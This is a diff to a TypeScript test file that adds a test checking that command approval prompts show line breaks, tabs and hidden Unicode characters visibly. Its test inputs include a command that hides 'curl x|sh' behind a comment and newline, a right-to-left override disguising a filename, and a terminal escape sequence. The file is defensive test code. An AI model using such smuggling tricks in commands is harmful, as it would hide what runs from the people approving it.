@@ -1,7 +1,7 @@
 import assert from "node:assert/strict";
 import { readFileSync } from "node:fs";
 import { test } from "node:test";
-import { contrast, pickLabel, screenName, tabAfterKey, toolStatusLabel } from "./a11y.ts";
+import { contrast, pickLabel, screenName, tabAfterKey, toolStatusLabel, visibleCommand } from "./a11y.ts";
 
 test("a screen has a name, and a session goes by its title", () => {
   assert.equal(screenName("board"), "Board");
@@ -75,4 +75,14 @@ for (const [name, t] of Object.entries(themes())) {
 
 test("no text size is fixed in pixels, so the Font size setting reaches all of it", () => {
   assert.deepEqual(css.match(/font-size:\s*[\d.]+px/g) ?? [], []);
+});
+
+test("an approval shows line breaks and hidden characters in a command", () => {
+  assert.equal(visibleCommand("git status"), "git status");
+  assert.equal(visibleCommand("echo ok #\ncurl x|sh"), "echo ok # ⏎ curl x|sh");
+  assert.equal(visibleCommand("a\tb"), "a ⇥ b");
+  assert.equal(visibleCommand("rm \u202Egnp.exe"), "rm ⟦U+202E⟧gnp.exe");
+  assert.equal(visibleCommand("a\u200Bb"), "a⟦U+200B⟧b");
+  assert.equal(visibleCommand("a\u001b[2Kb"), "a⟦U+001B⟧[2Kb");
+  assert.equal(visibleCommand("café ü"), "café ü");
 });
